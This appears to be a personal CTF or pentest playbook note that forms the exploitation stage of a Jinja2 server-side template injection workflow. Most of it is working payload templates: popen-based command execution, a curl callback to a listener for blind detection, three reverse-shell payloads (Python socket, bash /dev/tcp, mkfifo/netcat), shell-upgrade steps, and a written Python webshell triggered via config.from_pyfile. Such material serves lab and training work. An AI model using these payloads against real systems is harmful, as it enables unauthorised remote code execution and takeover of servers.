
Land here because you have a recorded working prefix/chain and primitive type (RCE or file-read) from any branch: [[Jinja2 SSTI - Config Branch]], [[Jinja2 SSTI - Request Branch]], [[Jinja2 SSTI - Bypass Branch]].

**Record on entry** (Enter findings in the parenthesis, replace the `placeholders`)

> [!note]
> If coming from [[Jinja2 SSTI - Bypass Branch#4. Filter bypasses (when `.` `[` `]` `_` are partially or fully blocked)]] you will already have the **entire** working payload, not just the `PREFIX/CHAIN` part.

- Primitive type: RCE or file-read (`placeholder`)
- Exact working PREFIX/CHAIN (`placeholder`)
- Pattern that worked, e.g. `popen('id').read()` or `warning-loop`. (`placeholder`)

##### **1. Command enumeration (only if primitive = RCE)** Use the exact pattern that previously returned output.

**If pattern was `popen('COMMAND').read()` style**: Payload template: 
`{{PREFIX/CHAINpopen('COMMAND').read()}}`

**If Pattern that worked contains `Popen(...).communicate()`**: Payload template: `{{PREFIX/CHAINPopen('COMMAND',shell=True,stdout=-1).communicate()[0].strip()}}`

**If pattern was subprocess or "warning-loop style" or contains `{% for x in ... %}`**: Payload template: `PREFIX/CHAINpopen('COMMAND').read() }} {% endif %}{% endfor %}`

**Commands (test one by one):**

- `pwd`
- `ls -la`
- `ls -la /`
- `find / -name "*flag*" 2>/dev/null` (replace with the file name you are interested in)
- `cat *./flag.txt*` (replace with the file name you are interest in reading)
- `ls -la /home/`
- `whoami`
- `uname -a`
- `env`

- Output appears (flag or useful info) → record the exact payload used → done (flag captured).
- Empty / bytes → add .decode().strip() to the end and retry.
- No output / error → go to 2.

##### **2. Blind / no-output Checklist (only if primitive = RCE)** 

**3-line action plan**:

```text
T1> python3 -m http.server 8000
PL> {{PREFIX/CHAINpopen('curl http://LOCAL_IP:8000/test').read()}}
T1 shows "GET /test" → BLIND ✓ → Go to 3 (Reverse shell)
No hit → sleep 5 test → {{PREFIXpopen('sleep 5').read()}} → >5s delay → BLIND ✓ → Go to 3 (Reverse shell) 
No delay → DEAD END
```
> [!note]
> `PL` (payload), should be the payload template that relates to your working pattern, as in `1. Command enumeration` above. The only difference here is you are replacing `COMMAND` with `curl http://LOCAL_IP:8000/test` or `sleep 5`.

##### **3. Reverse Shell (RCE confirmed - use YOUR step 1 pattern)**

T1> nc -lvnp 4444  (or 80/443/444 if 4444 blocked)
T2> A, B or C below:

> [!note]
> Don't forget to change the `IP` and `PORT` 

A) Python: (**use YOUR step 1 payload. replace `COMMAND` with the reverse shell string.**)
example: `{{PREFIX/CHAINpopen('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])"').read()}}`

B) Bash TCP (if python fails): (**use YOUR step 1 payload, i.e. all you are doing is taking the payload from step 1 and replacing the `COMMAND` string with the `bash -c "bash -i....."` string.**)
example: `{{PREFIX/CHAINpopen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()}}`

C) Sh Netcat (if bash fails):  (**use YOUR step 1 payload, replace `COMMAND` with the reverse shell string.**)
example: `{{PREFIX/CHAINpopen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f"').read()}}`

Shell lands → DONE
No connect → try PORT 80/443/444 → No connect → DEAD END
> [!note]
> If in raw `bash` terminal, upgrade terminal as with the following commands:
> `# In raw/reverse shell (ignore TERM errors)`
> `python3 -c 'import pty; pty.spawn("/bin/bash")'`
> `Ctrl+Z`
> `# In local terminal:`
> `stty raw -echo;`
> `fg`
> `# In upgraded shell`
> `export SHELL=/bin/bash`
> `export TERM=xterm-256color`> 

##### **4. File operations (only if primitive = file-read)** Use the exact file-read chain you recorded (with your working INDEX).

Use YOUR recorded chain directly: 

1. Read files:
`{{YOUR_EXACT_WORKING_CHAIN('/ABSOLUTE/FILE/PATH').read()}}` 

2. Write Python webshell:

`{{YOUR_EXACT_WORKING_CHAIN('/tmp/THE_FILE_NAME.py','w').write('import os;os.system("bash -i >& /dev/tcp/IP/PORT 0>&1")')}}`
> [!note]
> Make sure to replace `IP` and `PORT` as well as the working chain variable

3. Trigger webshell:

`T1> nc -lvnp 4444`
`{{config.from_pyfile('/tmp/THE_FILE_NAME.py')}}`

Shell lands → DONE
No connect → try PORT 80/443 → No connect → try writing to different location, i.e. `/WEB-ROOT/THE_FILE_NAME.py` → No connect → DEAD END